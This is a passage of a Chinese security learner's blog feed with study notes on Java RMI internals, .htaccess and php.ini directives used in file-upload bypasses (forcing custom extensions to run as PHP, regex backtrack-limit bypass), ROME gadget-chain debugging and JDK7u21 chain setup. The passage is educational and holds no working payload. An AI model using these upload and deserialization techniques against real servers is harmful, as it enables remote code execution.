    <content type="html"><![CDATA[<h1 id="RMI（1）"><a href="#RMI（1）" class="headerlink" title="RMI（1）"></a>RMI（1）</h1><p>这一周我都要好好总结一下RMI，安静下来，不要浮躁。<br>先来看看RPC。</p><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>RPC（Remote Procedure Call Protocol）远程过程调用协议，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203191716123.png" alt="QQ截图20220319171603"></p><p>简单的说，RPC就是从一台机器(客户端)上通过参数传递的方式调用另一台机器(服务器)上的一个函数或方法(可以统称为服务)并得到返回的结果。</p><h3 id="RPC框架"><a href="#RPC框架" class="headerlink" title="RPC框架"></a>RPC框架</h3><ol><li>客户端（Client）</li><li>客户端存根（Client Stub）：<strong>存放服务端地址信息，将客户端的请求参数数据信息打包成网络消息，再通过网络传输发送给服务端</strong></li><li>服务端存根（Server Stub）：<strong>接收客户端发送过来的请求消息并进行解包，然后再调用本地服务进行处理</strong></li><li>服务端（Server）</li></ol><h4 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h4><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203191729736.png" alt="QQ截图20220319172927"></p><p>这样我就搞懂了RPC了，很多文章说rmi跟rpc类似。<br>在回过头来看rmi。<br>这里就跟着su18的文章走一下。</p><h2 id="RMI整理流程图"><a href="#RMI整理流程图" class="headerlink" title="RMI整理流程图"></a>RMI整理流程图</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251378.png" alt="QQ截图20220319172357"></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="接口（远程调用）"><a href="#接口（远程调用）" class="headerlink" title="接口（远程调用）"></a>接口（远程调用）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="java-rmi-Remote"><a href="#java-rmi-Remote" class="headerlink" title="java.rmi.Remote"></a>java.rmi.Remote</h4><p>继承了Remote的接口中的方法，才可以被<strong>远程调用</strong>。</p><h4 id="java-rmi-RemoteException"><a href="#java-rmi-RemoteException" class="headerlink" title="java.rmi.RemoteException;"></a>java.rmi.RemoteException;</h4><p>RemoteException是所有在远程调用中所抛出异常的超类，所有能够被远程调用的方法声明，都需要抛出此异常。</p><h3 id="实现接口"><a href="#实现接口" class="headerlink" title="实现接口"></a>实现接口</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteInterface</span> &#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello My Friend--Xsw6_a&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> name.getClass().getName();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bye&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="java-rmi-server-UnicastRemoteObject"><a href="#java-rmi-server-UnicastRemoteObject" class="headerlink" title="java.rmi.server.UnicastRemoteObject"></a>java.rmi.server.UnicastRemoteObject</h4><p>用于获得一个stub。这个stub封装了底层细节，用于和远程对象进行通信。扩展此类后，RMI 会自动将这个类 export 给远程想要调用它的 Client 端，同时还提供了一些基础的 <code>equals/hashcode/toString</code> 方法。</p><h3 id="RMI（Registry）"><a href="#RMI（Registry）" class="headerlink" title="RMI（Registry）"></a>RMI（Registry）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Registry</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>            System.out.println(<span class="hljs-string">&quot;Server Start&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="java-rmi-registry-LocateRegistry"><a href="#java-rmi-registry-LocateRegistry" class="headerlink" title="java.rmi.registry.LocateRegistry"></a>java.rmi.registry.LocateRegistry</h4><p>用于获取到<code>RMI Registry</code>的一个连接，这个连接可以用于获取一个远程对象的引用。也可以创建一个注册中心。</p><h3 id="将待调用的类进行绑定"><a href="#将待调用的类进行绑定" class="headerlink" title="将待调用的类进行绑定"></a>将待调用的类进行绑定</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteServer</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;<br>        <span class="hljs-comment">// 创建远程对象</span><br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">// 绑定</span><br>        registry.bind(<span class="hljs-string">&quot;Hello&quot;</span>, remoteObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="java-rmi-Naming"><a href="#java-rmi-Naming" class="headerlink" title="java.rmi.Naming"></a>java.rmi.Naming</h4><p>这是一个 final 类，提供向<code>RMI Registry</code>保存远程对象引用或者从<code>RMI Registry</code>获取远程对象引用的方法。这个类中的方法都是静态方法，每一个方法都包含了一个类型为String的name参数, 这个参数是URL格式，形如:&#x2F;&#x2F;host:port&#x2F;name。</p><ul><li>host 表示注册表所在的主机</li><li>port 表示注册表接受调用的端口号，默认为 1099</li><li>name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键字</li></ul><h4 id="Naming的函数"><a href="#Naming的函数" class="headerlink" title="Naming的函数"></a>Naming的函数</h4><ul><li>bind(String name, Object obj)：注册对象，把对象和一个名字name绑定，这里的name其实就是URL格式。如果该名字已经与其他对象绑定，则抛出NameAlreadyBoundException错误；</li><li>rebind(String name, Object obj)：注册对象，把对象和一个名字name绑定。如果改名字已经与其他对象绑定，不会抛出NameAlreadyBoundException错误，而是把当前参数obj指定的对象覆盖原先的对象（更暴力）；</li><li>lookup(String name)：查找对象，返回与参数name指定的名字所绑定的对象；</li><li>unbind(String name)：注销对象，取消对象与名字的绑定；</li></ul><h3 id="客户端调用"><a href="#客户端调用" class="headerlink" title="客户端调用"></a>客户端调用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br><br>        <span class="hljs-comment">// sun.rmi.registry.RegistryImpl_Stub</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        System.out.println(Arrays.toString(registry.list()));<br><br>        <span class="hljs-comment">// lookup and call</span><br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (RemoteInterface) registry.lookup(<span class="hljs-string">&quot;Hello&quot;</span>);<br>        System.out.println(stub.sayHello());<br>        System.out.println(stub.sayGoodbye());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251398.png" alt="QQ截图20220321211527"></p><p>可以发现成功利用。</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="远程对象的创建"><a href="#远程对象的创建" class="headerlink" title="远程对象的创建"></a>远程对象的创建</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251436.png" alt="QQ截图20220321220836"></p><p>在初始化时，会创建一个 UnicastServerRef 对象，并调用其 <code>exportObject</code> 方法来 export RemoteObject 这个远程对象。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212214923.png" alt="QQ截图20220321221357"></p><p>使用 RemoteObjectInvocationHandler 来为我们测试写的 RemoteObject 实现的 RemoteInterface 接口创建动态代理。</p><p>这里我们先仔细看一下这个动态代理，按照以前的思路这里基本都是出发漏洞的地方（<strong>invoke方法</strong>）。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251908.png" alt="QQ截图20220321223031"></p><p>可以清楚的看到这里的，先判断是不是Object的方法如果是就会调用<br><code>invokeObjectMethod(proxy, method, args)</code>，反之调用<code>invokeRemoteMethod(proxy, method, args)</code>，很明显这里会调用<code>return invokeRemoteMethod(proxy, method, args);</code>进入看看。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251806.png" alt="QQ截图20220321224512"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251542.png" alt="QQ截图20220321224527"></p><p>而在 <code>invokeRemoteMethod</code> 中实际是委托 RemoteRef 的子类 UnicastRef 的 invoke 方法执行调用。</p><p>后续就是反序列化的方法了。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251465.png" alt="QQ截图20220321224742"></p><p>然后我们又知道这里是使用了动态代理，在之前的学习中只要使用了动态代理就会加载这个类的的invoke方法，那么这里如果像实现的方法中重写invoke（添加恶意代码，就可以触发。）</p><p>调用这个Target封装。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251888.png" alt="QQ截图20220321221822"></p><p>然后监听本地端口。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212220873.png" alt="QQ截图20220321222027"></p><p>然后调用 TCPTransport 的 exportObject 方法将 Target 实例注册到 ObjectTable 中。ObjectTable 用来管理所有发布的服务实例 Target，ObjectTable 提供了根据 ObjectEndpoint 和 Remote 实例两种方式查找 Target 的方法（不同参数的 getTarget 方法）。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203212251612.png" alt="QQ截图20220321222637"></p>]]></content>
    
    
    <categories>
      
      <category>RMI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022.3.19</title>
    <link href="/2022/03/19/2022-3-19/"/>
    <url>/2022/03/19/2022-3-19/</url>
    
    <content type="html"><![CDATA[<h1 id="2022-3-19"><a href="#2022-3-19" class="headerlink" title="2022.3.19"></a>2022.3.19</h1><p>一大早起来打虎符，两道题一个在环境变量里执行命令（待会看看p神文章）。另一道是文件上传（看了很久，一直把文件上传不上去）。然后中午去吃了个饭，去参加算法比赛，做了2道，编程什么的早就忘记了（很难受）。现在回来了，然后安装虚拟机，安装一次就蓝屏一次（<a href="https://blog.csdn.net/qq_44982110/article/details/122331129">解决办法</a>），最后找到了原因。win11真的很辣鸡，没事别更新。</p><p>等于白卷了一白天，很难受。要是打球打这么久，人都要爽没了。</p><p>现在等着虚拟机安装呢，来bb两句。真的烦躁。</p><p>真的难受，写博客又出现了，上传错误！！！！又要重新生成密钥。</p><p>16：46 才弄好 今天真是倒霉的一天  无奈。</p>]]></content>
    
    
    <categories>
      
      <category>历程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>历程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>.htaccess</title>
    <link href="/2022/03/19/htaccess/"/>
    <url>/2022/03/19/htaccess/</url>
    
    <content type="html"><![CDATA[<h1 id="htaccess的使用"><a href="#htaccess的使用" class="headerlink" title=".htaccess的使用"></a>.htaccess的使用</h1><p>跟着<a href="https://y4tacker.blog.csdn.net/">Y4tacker</a>师傅学习一下。（听了L.N.大佬的建议，跟着好师傅学习）</p><p>想起来，这个.htaccess的利用面试Nepnep的时候，被问到也就只能模棱两可的说出几句话出来。</p><p>不说了直接开始。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul><li><code>.htaccess</code>文件所在的目录及其所有子目录，若要启动<code>.htaccess</code>配置文件，我们需要在服务器的主配置文件将 AllowOverride 设置为 All</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">AllowOverride</span> All  <span class="hljs-comment">#启动.htaccess文件的使用</span><br></code></pre></td></tr></table></figure><ul><li>.htaccess 中有 # 单行注释符, 且支持 \拼接上下两行。</li></ul><h3 id="SetHandler和ForceType"><a href="#SetHandler和ForceType" class="headerlink" title="SetHandler和ForceType"></a>SetHandler和ForceType</h3><p>强制所有匹配的文件被一个指定的处理器处理<br>用法</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">ForceType <span class="hljs-built_in">application</span>/x-httpd-php<br>SetHandler <span class="hljs-built_in">application</span>/x-httpd-php<br></code></pre></td></tr></table></figure><h3 id="AddHandler"><a href="#AddHandler" class="headerlink" title="AddHandler"></a>AddHandler</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">AddType application/x-httpd-php <span class="hljs-string">.htm</span>，则<span class="hljs-string">.htm</span>文件也可以执行php程序<br>AddHandler cgi-script <span class="hljs-string">.yyy</span> 则扩展名为<span class="hljs-string">.yyy</span>的文件作为 CGI 脚本来处理<br></code></pre></td></tr></table></figure><h3 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a>AddType</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .xxx 同上AddHandler的作用<br></code></pre></td></tr></table></figure><h3 id="Apache-目录-访问控制-require"><a href="#Apache-目录-访问控制-require" class="headerlink" title="Apache 目录 访问控制 require"></a>Apache 目录 访问控制 require</h3><p>Require all granted #允许所有<br><a href="http://www.splaybow.com/post/apache-forbidden-directory-require.html">Come！</a></p><h3 id="php-flag-engine-on"><a href="#php-flag-engine-on" class="headerlink" title="php_flag engine on"></a>php_flag engine on</h3><p><strong>apache限制某个目录下的php文件有执行权限</strong></p><h2 id="php-ini中的设置"><a href="#php-ini中的设置" class="headerlink" title="php.ini中的设置"></a>php.ini中的设置</h2><p>这里只整理这篇文章所用到的（我第一反应不懂的&#x3D;.&#x3D;），想要好好了解到来<a href="https://www.php.net/manual/zh/ini.list.php">这里</a></p><ul><li><p><strong>allow_url_fopen</strong> 是否允许打开URL文件（默认开启）</p></li><li><p><strong>allow_url_include</strong> 是否允许引用URL文件（默认关闭）</p></li><li><p><strong>auto_prepend_file</strong> 和 <strong>auto_append_file</strong> 会解析文件<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203190938835.png" alt="QQ截图20220318150536"></p></li><li><p><strong>include_path</strong> nclude()的默认路径</p></li><li><p><strong>pcre.backtrack_limit</strong> 设置回溯值。<strong>（设置正则回朔次数来使正则匹配的结果返回为 false 而不是0 ，从而可以绕过正则。）</strong></p></li><li></li></ul><h3 id="配置可被设定的范围"><a href="#配置可被设定的范围" class="headerlink" title="配置可被设定的范围"></a>配置可被设定的范围</h3><table><thead><tr><th><code>PHP_INI_USER</code></th><th>可在用户脚本（例如 <a href="https://www.php.net/manual/zh/function.ini-set.php">ini_set()</a>）或 <a href="https://www.php.net/manual/zh/configuration.changes.php#configuration.changes.windows">Windows 注册表</a>以及 .user.ini 中设定</th></tr></thead><tbody><tr><td><code>PHP_INI_PERDIR</code></td><td>可在 php.ini，.htaccess 或 httpd.conf（<strong>httpd.conf是Apache网络服务器软件中重要的一个配置文件，它存储着Apache中许多必不可少的配置信息。最常用的一点，就是向里面添加建站网站信息。</strong>） 中设定</td></tr><tr><td><code>PHP_INI_SYSTEM</code></td><td>可在 php.ini 或 httpd.conf 中设定</td></tr><tr><td><code>PHP_INI_ALL</code></td><td>可在任何地方设定</td></tr></tbody></table><h3 id="php-value-php-flag-php-admin-value-php-admin-flag区别"><a href="#php-value-php-flag-php-admin-value-php-admin-flag区别" class="headerlink" title="php_value, php_flag, php_admin_value, php_admin_flag区别"></a>php_value, php_flag, php_admin_value, php_admin_flag区别</h3><p><a href="https://www.php.net/manual/zh/configuration.changes.php">Come！</a>（这里详细解释了！）</p><ul><li><p><strong>php_value name value</strong><br>设置指定的值. 只适合于 PHP_INI_ALL 和 PHP_INI_PERDIR 类型指令. 清除之前设置的值使用 none 标记. Note: 不要使用 php_value 设定布尔值和php_flag (见下文) .</p></li><li><p><strong>php_flag name on|off</strong><br>用于设置一个布尔配置指令, 只适合于 PHP_INI_ALL 和 PHP_INI_PERDIR 类型指令(和上面的不同就是 php_value 用于设置值(如字符串),而这只能设置 on off)</p></li><li><p><strong>php_admin_value name value</strong><br>功能和php_value一样,但这个不能用在 .htaccess 文件里, 只能在conf(包括virtualhost)文件里引用</p></li><li><p><strong>php_admin_flag name on|off</strong><br>同上</p></li></ul><h2 id="CGI扩展"><a href="#CGI扩展" class="headerlink" title="CGI扩展"></a>CGI扩展</h2><p>CGI扩展在物理上是一段程序，运行在服务器上，提供同客户端 Html页面的接口。CGI扩展是一个用于定Web服务器与外部程序之间通信方式的标准，<strong>使得外部程序能生成HTML、图像或者其他内容</strong>，而服务器处理的方式与那些非外部程序生成的 HTML、图像或其他内容的处理方式是相同的。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203190938451.png" alt="QQ截图20220319093010"></p><h2 id="FastCgi执行"><a href="#FastCgi执行" class="headerlink" title="FastCgi执行"></a>FastCgi执行</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203190938018.png" alt="QQ截图20220319093145"></p><p>后续的就简单看一下，今天又是偷学别人资料的一天（嘿嘿嘿~~）</p>]]></content>
    
    
    <categories>
      
      <category>文件上传</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>理解ROME链的缩短</title>
    <link href="/2022/03/17/%E7%90%86%E8%A7%A3ROME%E9%93%BE%E7%9A%84%E7%BC%A9%E7%9F%AD/"/>
    <url>/2022/03/17/%E7%90%86%E8%A7%A3ROME%E9%93%BE%E7%9A%84%E7%BC%A9%E7%9F%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="理解ROME链的缩短"><a href="#理解ROME链的缩短" class="headerlink" title="理解ROME链的缩短"></a>理解ROME链的缩短</h1><h2 id="Y4tacker的简单问题"><a href="#Y4tacker的简单问题" class="headerlink" title="Y4tacker的简单问题"></a>Y4tacker的简单问题</h2><p><strong>我觉得挺难</strong>。（如果一开始就静下心来调试可能就会简单一些。）</p><p>真希望有一天我也可以独自去研究这些代码，而不是跟别的师傅学习。</p><p>一开始没有调试想偷懒，发现根本不行。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203172304235.png" alt="QQ截图20220317211300"></p><p>为什么要构造成这种？<br>首先第一点我们要知道当一个map中传入两个值后会对比key的值，然后会进入到</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203172116387.png" alt="QQ截图20220317211641"></p><p>但是我们注意到这里的红框内容，<strong>k&#x3D;p.key</strong>,这里也就解释了为什么需要aa–&gt;bB的变化。if（条件的判断形式和顺序）。</p><p>然后就是为什么要改变顺序。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203172304925.png" alt="QQ截图20220317214833"></p><p>第一次进入<strong>AbstractMap#equals</strong>的时候，这里的aa对应的是这样的。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203172150470.png" alt="QQ截图20220317214915"></p><p>继续向下走（这里还是在第一次进入的时候 aa对应的类变了！！！）。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203172208312.png" alt="QQ截图20220317220819"></p><p>经过这里之后value就变成（<strong>EqualBean</strong>）了。</p><p>在第二次进入<strong>AbstractMap#equals</strong>的时候（<strong>这时候就是反序列化的时候</strong>），这里aa对应的还是这个<strong>EqualBean</strong>，很离谱，<strong>不同的是第一次没有传入参数，第二次传入了参数（_obj等）</strong>，导致了成功触发rce。</p><p>这里也就是说这么构造的原因，只是为了让在迭代的时候第一个显示<strong>EqualBean类</strong></p><p><strong>但是为什么在迭代的时候第一个显示就是aa对应的类？？？</strong></p><p>跟了几次还是不懂。跟进**entrySet().iterator()**，也是直接变化了。希望以后得到解决。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203172304256.png" alt="QQ截图20220317230250"></p>]]></content>
    
    
    <categories>
      
      <category>ROME</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jdk7u21原生链</title>
    <link href="/2022/03/16/Jdk7u21%E5%8E%9F%E7%94%9F%E9%93%BE/"/>
    <url>/2022/03/16/Jdk7u21%E5%8E%9F%E7%94%9F%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="JDK7u21原生链"><a href="#JDK7u21原生链" class="headerlink" title="JDK7u21原生链"></a>JDK7u21原生链</h1><p>之前一直是看过许多文章（因为它不需要依赖别的库）就可以攻击。看到p神（知识星球）发了文章就手动跟一下。</p><h2 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h2><p>之前就已经学习过了。复习一下。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavassistDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> aDefault.get(Demo.class.getName());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;System.out.println(\&quot;Xsw6_a\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(s);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">demohaha</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Demohaha&quot;</span>;<br>        ctClass.setName(demohaha);<br>        ctClass.writeFile();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里会生成如下的class文件。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642740.png" 